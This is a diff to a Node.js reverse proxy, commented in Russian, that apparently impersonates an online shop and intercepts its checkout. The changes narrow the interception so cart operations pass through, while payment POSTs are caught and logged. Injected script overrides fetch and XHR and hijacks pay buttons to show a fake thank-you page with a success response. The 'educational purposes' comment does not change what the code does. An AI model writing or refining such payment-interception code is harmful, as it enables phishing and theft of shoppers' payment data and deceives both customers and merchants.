@@ -99,15 +99,21 @@ const proxyOptions = {
   },
   onProxyRes: (proxyRes, req, res) => {
     // Проверяем, является ли это страницей оплаты/checkout
+    // ИСКЛЮЧАЕМ операции с корзиной (добавление, обновление товаров)
     const pathLower = req.path.toLowerCase();
     const urlLower = req.url.toLowerCase();
-    const isPaymentPage = pathLower.includes('checkout') ||
-                         pathLower.includes('payment') ||
-                         pathLower.includes('paiement') ||
-                         pathLower.includes('cart') ||
-                         urlLower.includes('checkout') ||
-                         urlLower.includes('payment') ||
-                         urlLower.includes('paiement');
+    const isCartOperation = pathLower.includes('/cart/add') ||
+                           pathLower.includes('/cart/update') ||
+                           pathLower.includes('/cart/change') ||
+                           pathLower.match(/\/cart\/?$/);
+    
+    const isPaymentPage = !isCartOperation && (
+                         pathLower.includes('/checkout') ||
+                         pathLower.includes('/payment') ||
+                         pathLower.includes('/paiement') ||
+                         urlLower.includes('/checkout') ||
+                         urlLower.includes('/payment') ||
+                         urlLower.includes('/paiement'));
     
     // Модифицируем заголовки
     const modifiedHeaders = { ...proxyRes.headers };
@@ -145,12 +151,17 @@ const proxyOptions = {
       if (contentType.includes('application/json') || contentType.includes('text/json')) {
         const pathLower = req.path.toLowerCase();
         const urlLower = req.url.toLowerCase();
-        const isPaymentAPI = pathLower.includes('checkout') ||
-                            pathLower.includes('payment') ||
-                            pathLower.includes('paiement') ||
-                            pathLower.includes('cart') ||
-                            urlLower.includes('checkout') ||
-                            urlLower.includes('payment');
+        // Исключаем операции с корзиной
+        const isCartOperation = pathLower.includes('/cart/add') ||
+                               pathLower.includes('/cart/update') ||
+                               pathLower.includes('/cart/change') ||
+                               pathLower.match(/\/cart\/?$/);
+        
+        const isPaymentAPI = (pathLower.includes('/checkout') ||
+                            pathLower.includes('/payment') ||
+                            pathLower.includes('/paiement') ||
+                            urlLower.includes('/checkout') ||
+                            urlLower.includes('/payment')) && !isCartOperation;
         
         if (isPaymentAPI) {
           console.log(`[PAYMENT INTERCEPT] Intercepting JSON API response: ${req.method} ${req.path}`);
@@ -198,18 +209,24 @@ const proxyOptions = {
         const id = String(target.id || '').toLowerCase();
         
         // Проверяем, является ли это кнопкой оплаты
-        const isPaymentButton = text.includes('paiement') ||
+        // ИСКЛЮЧАЕМ: "add to cart", "add", кнопки добавления в корзину
+        // ПЕРЕХВАТЫВАЕМ: только реальные кнопки оплаты
+        const isAddToCart = text.includes('add to cart') || 
+                           text.includes('add') && (text.includes('cart') || className.includes('cart') || id.includes('cart'));
+        
+        const isPaymentButton = !isAddToCart && (
+                               text.includes('paiement') ||
                                text.includes('payment') ||
-                               text.includes('checkout') ||
-                               text.includes('pay') ||
+                               (text.includes('checkout') && !text.includes('add')) ||
+                               (text.includes('pay') && !text.includes('add')) ||
                                text.includes('payer') ||
-                               className.includes('checkout') ||
+                               className.includes('checkout') && !className.includes('add') ||
                                className.includes('payment') ||
                                className.includes('paiement') ||
-                               id.includes('checkout') ||
+                               (id.includes('checkout') && !id.includes('add')) ||
                                id.includes('payment') ||
-                               href.toLowerCase().includes('checkout') ||
-                               href.toLowerCase().includes('payment');
+                               (href.toLowerCase().includes('checkout') && !href.toLowerCase().includes('add')) ||
+                               href.toLowerCase().includes('payment'));
         
         if (isPaymentButton) {
           console.log('[PAYMENT INTERCEPT] Payment button clicked, intercepting...');
@@ -238,7 +255,16 @@ const proxyOptions = {
       XMLHttpRequest.prototype.send = function() {
         const url = String(this._url || '').toLowerCase();
         
-        if (url.includes('checkout') || url.includes('payment') || url.includes('paiement') || url.includes('cart')) {
+        // Перехватываем только реальные запросы к оплате, НЕ работу с корзиной
+        // Исключаем: /cart/add, /cart/update, /cart/change, /cart (получение корзины)
+        // Перехватываем: /checkout, /cart/checkout, /payment, /paiement
+        const isPaymentRequest = (url.includes('/checkout') || url.includes('/payment') || url.includes('/paiement')) &&
+                                !url.includes('/cart/add') &&
+                                !url.includes('/cart/update') &&
+                                !url.includes('/cart/change') &&
+                                !url.match(/\/cart\/?$/); // не просто /cart
+        
+        if (isPaymentRequest) {
           console.log('[PAYMENT INTERCEPT] Intercepting XHR request:', url);
           this.addEventListener('load', function() {
             console.log('[PAYMENT INTERCEPT] XHR response intercepted');
@@ -258,7 +284,16 @@ const proxyOptions = {
       window.fetch = function(url, options) {
         const urlStr = String(typeof url === 'string' ? url : (url && url.url) || '').toLowerCase();
         
-        if (urlStr.includes('checkout') || urlStr.includes('payment') || urlStr.includes('paiement') || urlStr.includes('cart')) {
+        // Перехватываем только реальные запросы к оплате, НЕ работу с корзиной
+        // Исключаем: /cart/add, /cart/update, /cart/change, /cart (получение корзины)
+        // Перехватываем: /checkout, /cart/checkout, /payment, /paiement
+        const isPaymentRequest = (urlStr.includes('/checkout') || urlStr.includes('/payment') || urlStr.includes('/paiement')) &&
+                                !urlStr.includes('/cart/add') &&
+                                !urlStr.includes('/cart/update') &&
+                                !urlStr.includes('/cart/change') &&
+                                !urlStr.match(/\/cart\/?$/); // не просто /cart
+        
+        if (isPaymentRequest) {
           console.log('[PAYMENT INTERCEPT] Intercepting Fetch request:', urlStr);
           showThankYouPage();
           return Promise.resolve(new Response(JSON.stringify({ success: true, redirect: 'https://www.youtube.com/results?search_query=%D0%A4%D0%90%D0%A0%D0%9C+%D0%9E%D0%9F%D0%AB%D0%A2%D0%90+%D0%91%D0%A46&sp=EgQIBBAB' }), {
@@ -557,18 +592,26 @@ app.use((req, res, next) => {
   const pathLower = req.path.toLowerCase();
   const urlLower = req.url.toLowerCase();
   
-  // Проверяем, является ли это запросом к странице оплаты
-  const isPaymentPage = paymentPaths.some(path => 
-    pathLower.includes(path.toLowerCase())
-  ) || pathLower.includes('checkout') ||
-     pathLower.includes('payment') ||
-     pathLower.includes('paiement') ||
-     urlLower.includes('checkout') ||
-     urlLower.includes('payment') ||
-     urlLower.includes('paiement');
+  // ИСКЛЮЧАЕМ операции с корзиной (добавление, обновление товаров)
+  const isCartOperation = pathLower.includes('/cart/add') ||
+                         pathLower.includes('/cart/update') ||
+                         pathLower.includes('/cart/change') ||
+                         pathLower.match(/\/cart\/?$/);
   
-  // Перехватываем POST/PUT/PATCH запросы к страницам оплаты
-  if (isPaymentPage && (req.method === 'POST' || req.method === 'PUT' || req.method === 'PATCH')) {
+  // Проверяем, является ли это запросом к странице оплаты
+  const isPaymentPage = !isCartOperation && (
+    paymentPaths.some(path => 
+      pathLower.includes(path.toLowerCase())
+    ) || (pathLower.includes('/checkout') && !pathLower.includes('/cart/add')) ||
+       (pathLower.includes('/payment') && !pathLower.includes('/cart')) ||
+       (pathLower.includes('/paiement') && !pathLower.includes('/cart')) ||
+       (urlLower.includes('/checkout') && !urlLower.includes('/cart/add')) ||
+       (urlLower.includes('/payment') && !urlLower.includes('/cart')) ||
+       (urlLower.includes('/paiement') && !urlLower.includes('/cart'))
+  );
+  
+  // Перехватываем POST/PUT/PATCH запросы к страницам оплаты (НЕ операции с корзиной)
+  if (isPaymentPage && !isCartOperation && (req.method === 'POST' || req.method === 'PUT' || req.method === 'PATCH')) {
     console.log(`[PAYMENT INTERCEPT] Intercepting ${req.method} payment request: ${req.method} ${req.path} ${req.url}`);
     
     // Логируем данные для образовательных целей (не сохраняем чувствительные данные)
